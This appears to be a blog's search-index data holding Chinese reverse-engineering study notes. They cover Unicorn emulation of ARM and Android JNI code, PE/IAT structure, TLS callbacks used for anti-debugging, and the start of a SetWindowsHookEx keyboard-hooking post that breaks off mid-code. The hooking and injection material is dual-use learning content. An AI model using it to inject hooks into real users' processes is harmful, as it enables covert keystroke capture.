编译方法","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"ollvm做法","slug":"ollvm做法","date":"2023-01-02T14:06:24.000Z","updated":"2023-01-12T14:08:24.883Z","comments":true,"path":"2023/01/02/ollvm做法/","link":"","permalink":"https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/","excerpt":"unicorn start","text":"unicorn start 目标:处理ollvm混淆 用脚本处理该函数在脚本中设置起始地址和文件名 然后执行该python文件","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning4","slug":"unicorn-learning4","date":"2022-12-31T06:12:48.000Z","updated":"2022-12-31T08:10:21.907Z","comments":true,"path":"2022/12/31/unicorn-learning4/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning4/","excerpt":"unicorn_starting 模拟Jni与Java交互","text":"unicorn_starting 模拟Jni与Java交互 目标hook这个函数，其中存在调用java类和java函数 尝试将上一次的代码进行修改后直接执行，观察结果 注册java类和方法结果发现不能找到java这个类，下面已经给出申明，直接复制即可 12345class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass# 添加自定义java类emulator.java_classloader.add_class(com_sec_udemo_MainActivity) 执行后发现又要声明相关方法: 声明方法： 1234@java_method_def(name=&#x27;getSaltFromJava&#x27;,signature=&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;, args_list=[&#x27;jstring&#x27;],native=False) # 这里native=False申明此方法非native方法def getSaltFromJava(self,mu,data): pass 这个函数在java中的功能如下： 这里我们作出拼接返回即可 执行后再次报错 这里我们缺少jobject对象，这里我们手动创建一下，然后传入进去 1234obj = com_sec_udemo_MainActivity()sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;, emulator.java_vm.jni_env.address_ptr,obj,&#x27;123&#x27;)print(sign) 然后这里又有相加时出现错误 这里我们调试一下，data的内容： 一看是java string类型，类型展开发现value中value就是python的str类型 修改后成功出结果： 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from unicorn import *import loggingimport sysfrom androidemu.java.helpers.native_method import native_methodfrom UnicornTraceDebugger import udbgfrom androidemu.emulator import Emulatorfrom androidemu.utils import memory_helpersfrom androidemu.java.java_classloader import JavaClassDeffrom androidemu.java.java_method_def import java_method_def# 配置logginglogging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# 用于打印调试信息logger = logging.getLogger(__name__)class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass @java_method_def(name=&#x27;getSaltFromJava&#x27;,signature=&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;, args_list=[&#x27;jstring&#x27;],native=False) def getSaltFromJava(self,mu,data): print(&#x27;hello&#x27;) return data.value.value + &#x27;salt..&#x27;# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format))# 创建模拟器emulator = Emulator()# 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容# 在导入so文件之前hook才生效，导入之后没法hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1)emulator.modules.add_symbol_hook(&#x27;__aeabi_memcpy&#x27;, emulator.hooker.write_function(__aeabi_memcpy) + 1)emulator.modules.add_symbol_hook(&#x27;sprintf&#x27;, emulator.hooker.write_function(sprintf) + 1)# 添加自定义java类emulator.java_classloader.add_class(com_sec_udemo_MainActivity)# 加载相关so文件# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，# 这可能会涉及更多库的调用emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 obj = com_sec_udemo_MainActivity() sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;, emulator.java_vm.jni_env.address_ptr,obj,&#x27;123&#x27;) print(sign)except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning3","slug":"unicorn-learning3","date":"2022-12-31T01:12:04.000Z","updated":"2022-12-31T03:18:14.288Z","comments":true,"path":"2022/12/31/unicorn-learning3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning3/","excerpt":"unicorn start 模拟器框架自动填充got表项内容","text":"unicorn start 模拟器框架自动填充got表项内容 目标hook JNI函数 hook JNI函数的条件： 框架： 打印调试信息1234567891011import loggingimport sys# 配置logginglogging.basicConfig( stream=sys.stdout, level=logging.debug, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# 用于打印调试信息logger = logging.getLogger(__name__) 创建模拟器+导入so文件+执行用写好的框架进行模拟执行，不需要考虑手动填充got表项 1234567891011121314151617181920# 创建模拟器emulator = Emulator()# 加载相关so文件# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，# 这可能会涉及更多库的调用emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: print(e) 这里出现libc的基地址 这里出现libnative-lib.so的基地址。3）处有报错，但又不知道哪里有错 跟踪报错信息打印异常地址和地址调用栈,这里打印最后100条即可,用udbg打印 1234567891011121314151617181920# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) # 注意这里要减去基地址 print(e) 这里有函数参数提示： 这里有出现负地址，负地址就是函数执行到libc.so文件中，这里由于没有初始化的缘故，可能libc中部分函数执行失败，这里我们手动hook，&#x3D;&#x3D;本质是hook got表地址&#x3D;&#x3D; 这里我们定位到ida中出错的地址 发现是这个库函数有问题。那就hook它 hook添加hook 此处必须在导入so文件之前就hook，在导入so文件之前hook才生效，导入之后没法hook 123456789# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器@native_methoddef __aeabi_memclr(mu,addr,size): print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size)) # 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容# 在导入so文件之前hook才生效，导入之后没法hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1) 其他函数以此类推 关于sprintf函数，第一个参数，是a2，就是buffer地址 全部函数hook后： 这里输出是空因为，我们hook相关函数还未在unicorn中实现，这里我们做个实现即可 123456789101112131415161718@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format)) 这里说明一下bytes()函数放入int型会输出什么： 最终结果： 全部代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from unicorn import *import loggingimport sysfrom androidemu.java.helpers.native_method import native_methodfrom UnicornTraceDebugger import udbgfrom androidemu.emulator import Emulatorfrom androidemu.utils import memory_helpers# 配置logginglogging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# 用于打印调试信息logger = logging.getLogger(__name__)# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format))# 创建模拟器emulator = Emulator()# 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容# 在导入so文件之前hook才生效，导入之后没法hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1)emulator.modules.add_symbol_hook(&#x27;__aeabi_memcpy&#x27;, emulator.hooker.write_function(__aeabi_memcpy) + 1)emulator.modules.add_symbol_hook(&#x27;sprintf&#x27;, emulator.hooker.write_function(sprintf) + 1)# 加载相关so文件# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，# 这可能会涉及更多库的调用emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning2","slug":"unicorn-learning2","date":"2022-12-30T01:40:33.000Z","updated":"2022-12-30T07:24:54.480Z","comments":true,"path":"2022/12/30/unicorn-learning2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/30/unicorn-learning2/","excerpt":"unicorn start 用unicorn调用so文件中的某个函数，观察函数的输入与输出","text":"unicorn start 用unicorn调用so文件中的某个函数，观察函数的输入与输出 目标hook so文件中的sign1函数的输出与输入 这个函数内部调用了两个函数，tea_encrypt和sprintf，这两个函数中tea_encrypt函数只需要修复got表项即可调用tea_encrypt，但是sprintf函数不行 这里我们开始实验 创建虚拟机由于这里的指令都是两个字节为一条指令 所以这里为thumb指令集 1234567891011def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # mu就是arm虚拟机 建立内存映射+写入数据由于这是要模拟执行一段函数，所以要建立镜像区，栈区，数据段区的内存 这里各个区的大小存粹靠估算 12345678910111213141516171819image = open(&#x27;./libnative-lib.so&#x27;,&#x27;rb&#x27;).read()# 镜像内存image_base = 0x0mu.mem_map(image_base, 0x10000*8) # 这里大小自己估算mu.mem_write(image_base,image)# 栈内存stack_base = 0xa0000stack_size = 0x10000 * 3mu.mem_map(stack_base, stack_size) # 这里大小自己估算stack_top = stack_base + stack_size - 0x4mu.reg_write(UC_ARM_REG_SP,stack_top)# 数据段内存a1 = b&#x27;123&#x27;data_base = 0xf0000data_size = 0x10000 * 3mu.mem_map(data_base, data_size) # 这里大小自己估算mu.mem_write(data_base,a1) 这里栈区的sp指针应小于栈大小的0x4，防止栈溢出，这里我们将‘123’字符串写入数据段，来作为函数的参数使用 添加hook函数主要用于程序报错时可以及时追踪到哪里有问题 123456789def hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) mu.hook_add(UC_HOOK_CODE,hook_code,0)mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0) 开始执行12345678910#开始执行虚拟机start_addr = 0x9B68end_addr = 0x9C2Ctry: mu.emu_start(start_addr, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e) 结果只运行到第一条指令： 这里将开始地址+1，然后执行： 然后这里就遇到了函数地址外的地址，很奇怪！！！，这里找到0x91ac,也就是最后一次正常的地方，发现来到了plt表，点击后又来到got表，这里的got表其实是ida已经自动补全了，unicorn需要自己手动补全 补全后： 执行代码： 123456789101112#开始执行虚拟机start_addr = 0x9B68end_addr = 0x9C2Ctry: # 添加got表 mu.mem_write(0x1EDB0,b&#x27;\\xD9\\x98\\x00\\x00&#x27;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e) 最后代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from unicorn import *from unicorn.arm_const import *import binasciidef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # mu就是arm虚拟机image = open(&#x27;./libnative-lib.so&#x27;,&#x27;rb&#x27;).read()# 镜像内存image_base = 0x0mu.mem_map(image_base, 0x10000*8) # 这里大小自己估算mu.mem_write(image_base,image)# 栈内存stack_base = 0xa0000stack_size = 0x10000 * 3mu.mem_map(stack_base, stack_size) # 这里大小自己估算stack_top = stack_base + stack_size - 0x4mu.reg_write(UC_ARM_REG_SP,stack_top)# 数据段内存a1 = b&#x27;123&#x27;data_base = 0xf0000data_size = 0x10000 * 3mu.mem_map(data_base, data_size) # 这里大小自己估算mu.mem_write(data_base,a1)#函数参数通过数据段传递 寄存器是R0mu.reg_write(UC_ARM_REG_R0,data_base)# 添加hook函数# mu.hook_add(UC_HOOK_CODE,hook_code,0)# mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0)#开始执行虚拟机start_addr = 0x9B68end_addr = 0x9C2Ctry: # 添加got表 mu.mem_write(0x1EDB0,b&#x27;\\xD9\\x98\\x00\\x00&#x27;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res))except UcError as e: print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning1","slug":"unicorn1","date":"2022-12-29T06:32:54.000Z","updated":"2022-12-29T07:54:07.945Z","comments":true,"path":"2022/12/29/unicorn1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/29/unicorn1/","excerpt":"unicorn start! 效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了","text":"unicorn start! 效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了 Unicorn 入门学习unicorn 是用于执行多种cpu框架的虚拟架构系统 下面进行模仿arm架构，执行arm指令首先在python中导入unicorn 1from unicorn import * 如何根据自己要执行指令对应哪个cpu架构，来导入相应的处理器相关的常量 123456from unicorn.arm_const import *from unicorn.arm64_const import *from unicorn.m68k_const import *from unicorn.mips_const import *from unicorn.sparc_const import *from unicorn.x86_const import * 寄存器常量命名规则：UC_ + 指令集 + REG + 大写寄存器名UC_ARMREG + 大写寄存器名 （UC_ARM_REG_R0）UC_X86REG + 大写寄存器名 （UC_X86_REG_EAX） 这里我们选择unicorn.arm_const 创建arm虚拟机（UC）Uc 是unicorn的主类，Uc对象则代表了一个独立的虚拟机实例，它有独立的寄存器和内存等资源，不同Uc对象之间的数据是独立的。Uc的构造函数有两个参数 arch 和 mode，用来指定模拟执行的指令集和对应的位数或模式。arch常量参数一般以 UCARCH 开头，MODE常量以UCMODE 开头。 123456789101112# Test ARMdef test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_ARM) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e)mu = test_arm() # mu就是arm虚拟机 映射内存想用Unicorn模拟执行代码，是不能将代码字节流直接以参数形式传递给Unicorn，而是将要执行的代码写入到Unicorn 的虚拟内存中。Uc 虚拟机实例初始内存是没有任何映射的，在读写内存之前使用uc_mem_map函数映射一段内存 这里开始地址和地址大小都要和0x1000&#x3D;&#x3D;对齐&#x3D;&#x3D; 否则就是我这种错误： 12ADDRESS = 0x10000mu.mem_map(ADDRESS, 0x1000) # 这里大小自己估算 写入代码将想要执行的代码写进我们创建的内存中 mem_write的第二个参数必须是byte字节数组，只支持python的byte数组，不能是String或者bytearray。 1234ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot;# mov r0, #0x37;# sub r1, r2, r3mu.mem_write(ADDRESS, ARM_CODE) 给寄存器初始赋值 1234mu.reg_write(UC_ARM_REG_R0, 0x0)mu.reg_write(UC_ARM_REG_R2, 0x4)mu.reg_write(UC_ARM_REG_R3, 0x1)# 这里r1的结果预估是0x3 添加指令级的Hookhook类型： 指令执行类： UC_HOOK_INTR UC_HOOK_INSN UC_HOOK_CODE UC_HOOK_BLOCK 内存访问类： UC_HOOK_MEM_READ UC_HOOK_MEM_WRITE UC_HOOK_MEM_FETCH UC_HOOK_MEM_READ_AFTER UC_HOOK_MEM_PROT UC_HOOK_MEM_FETCH_INVALID UC_HOOK_MEM_INVALID UC_HOOK_MEM_VALID 异常处理类： UC_HOOK_MEM_READ_UNMAPPED UC_HOOK_MEM_WRITE_UNMAPPED UC_HOOK_MEM_FETCH_UNMAPPED 123def hook_add(self, htype, callback, user_data=None, begin=1, end=0, arg1=0): passmu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=0x1000) 以上是添加hook的操作 在begin…end范围内的每一条指令被执行前都会调用callback。 hook函数编写： 123# callback for tracing instructionsdef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) 执行虚拟机emu_start 可以通过timeout参数设置最长执行时长，防止线程死在虚拟机里面。emu_start 执行完成后，可以通过读取内存或寄存器的方式来获取执行结果。 123def emu_start(self, begin, until, timeout=0, count=0): passmu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) 执行成功，hook函数一共被调用两次（指令有两条） 获取寄存器结果1234r0 = mu.reg_read(UC_ARM_REG_R0)r1 = mu.reg_read(UC_ARM_REG_R1)print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0)print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) 和推理的结果相同！！！！ 个人测试全过程： 完整代码： 1234567891011121314151617181920212223242526272829303132333435from unicorn import *from unicorn.arm_const import *ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot;# mov r0, #0x37;# sub r1, r2, r3# Test ARM # callback for tracing instructionsdef hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # map 2MB memory for this emulation ADDRESS = 0x10000 mu.mem_map(ADDRESS, 2 * 0x10000) mu.mem_write(ADDRESS, ARM_CODE) mu.reg_write(UC_ARM_REG_R0, 0x1234) mu.reg_write(UC_ARM_REG_R2, 0x6789) mu.reg_write(UC_ARM_REG_R3, 0x3333) mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS) # emulate machine code in infinite time mu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) r0 = mu.reg_read(UC_ARM_REG_R0) r1 = mu.reg_read(UC_ARM_REG_R1) print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0) print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) except UcError as e: print(&quot;ERROR: %s&quot; % e) 文章引用Pandaos大佬的文章：[原创] Unicorn 在 Android 的应用-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"re_base3","slug":"re-base3","date":"2022-12-22T11:33:01.000Z","updated":"2022-12-22T13:20:03.197Z","comments":true,"path":"2022/12/22/re-base3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/22/re-base3/","excerpt":"PE and IAT hook","text":"PE and IAT hook PE由于了解IAT,需要了解一点PE,这里把PE也给写了吧 PE文件种类： OBJ文件不能执行，dll和sys文件需要调试器执行或者服务和程序加载执行 DOS签名和PE签名 PE文件大体分为：1.PE头、2.PE体 1.PE头 DOS签名 DOS存根 NT头 一系列节区头 .data(数据) .text(代码) .rsrc(资源) 2.PE体：一系列节区 名词介绍： ​ VA:virtual address 绝对虚拟内存地址 ​ RVA:相对虚拟内存地址 ​ VA &#x3D; RVA + imageBase DOS头结构体：唯一有用的就是e_magic和e_lfanew 其中e_magic就是Dos签名，e_lfanew就是NT头的偏移 DOS存根Dos存根是兼容dos系统的一种产物，可有可无，内容可用xp内置debug查看 内容是一段汇编代码，在dos系统中执行 NT头NT头结构体 签名不作介绍，文件头结构体： Machine代表cpu类别 SizeOfOptionalHeader是表示可选头的大小 Characteristics表示文件是否是dll，是否可执行 NT可选头结构体： NT可选头非常重要，它记录了很多重要的数据 ImageBase，是映像基址，映像指的是PE文件加载到内存的一种形态（我觉得更像是一种叫法），映像基址定义了文件加载进内存的基础地址 SectionAlignment, 节区对齐是文件在内存中的最小单位，文件在内存的大小应该是这个值的整数倍 FileAlignment, 文件对齐是文件在磁盘中的最小单位，文件在磁盘的大小应该是这个值的整数倍 Subsystem,子系统用来区分文件是sys驱动文件还是exe可执行文件 NumberOfRvaAndSizes , 记录DataDirectory数组的个数 DataDirectory： 节区头结构体： 这里的VirtualAddress是用RVA表示的 RAV to RAWRAW就是文件中节区的偏移（非内存） IAT导入地址表映像导入描述结构体： 文件导入多少个库文件，就有多少个 image_import_descriptor结构体 &#x3D;&#x3D;该结构体的地址保存在image_optional_header32.DataDirectory[1].VirtualAddress中&#x3D;&#x3D; INT结构体保存着Image_import_by_name的指针 结构图： PE装载器将导入函数加载到IAT的顺序： EAT不想写了，和IAT差不多，一个导入一个导出 它的查找数据先是image_optional_header32.DataDirectory[0].VirtualAddress找到这个结构体，然后根据要找的函数名去AddressOfNames数组里面拿到下标，然后用下标再去Oridinal数组找，找到下标又去AddressOfFunction那里找函数地址 没有函数名直接用Ordinal查找，Ordinal数组存在的意义是我忘了。。反正就这样 IAT hook","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"re_base2","slug":"re-base2","date":"2022-12-21T13:56:29.000Z","updated":"2022-12-22T03:22:59.840Z","comments":true,"path":"2022/12/21/re-base2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/21/re-base2/","excerpt":"TLS and keyboard hooking","text":"TLS and keyboard hooking TLS回调TLS(Thread Local Storage) 线程本地存储，主要用于提供本地线程访问局部数据的句柄。 下面来一段官方解释： 使用线程本地存储 （TLS），可以为进程可以使用全局索引访问的每个线程提供唯一数据。一个线程分配索引，其他线程可以使用它来检索与索引关联的唯一数据 原理图： &#x3D;&#x3D;TLS主要用于程序的反调试检测&#x3D;&#x3D; 它在运行EP（entrypoint 程序入口代码）代码前执行 TLS结构体： 可以看到TLS结构体中保存着回调函数的地址 可以打开CFF explore软件直接查看存放TLS回调函数数组的地址 打开od查看它的地址为401000 汇编直接定位过去就出来了 TLS回调函数是在进程或线程创建或终止时调用，如果某个进程存在一个线程，那从程序的创建到销毁需要4次调用回调函数 TLS回调函数定义： 注册TLS程序示例代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;windows.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void print_console(char* szMsg)&#123; HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE); WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;) PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID lParam)&#123; print_console(&quot;ThreadProc() start\\n&quot;); print_console(&quot;ThreadProc() end\\n&quot;); return 0;&#125;int main(void)&#123; HANDLE hThread = NULL; print_console(&quot;main() start\\n&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, 60*1000); CloseHandle(hThread); print_console(&quot;main() end\\n&quot;); return 0;&#125; 调试TLS回调函数直接在运行前设置调试选项 添加TLS这里不做阐述 keyboard hooking消息钩取工作原理 使用SetWindowsHookEx()可以实现消息钩子，钩子函数需要存在于dll文件中，由操作系统调用回调函数 API定义： 在某进程拥有消息，操作系统就会将dll注入进程序中，实现消息钩取 只需要一个程序加载安装钩子所在的dll程序，然后SetWindowsHookEx()注册钩子，操作系统就会检测每一个程序的行为，一旦发生键盘输入，就将dll文件注入。 加载dll注册hook实例： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &quot;stdio.h&quot;#include &quot;conio.h&quot;#include &quot;windows.h&quot;#define DEF_DLL_NAME &quot;KeyHook.dll&quot;#define DEF_HOOKSTART &quot;HookStart&quot;#define DEF_HOOKSTOP &quot;HookStop&quot;typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main()&#123; HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; // KeyHook.dll 肺爹 hDll = 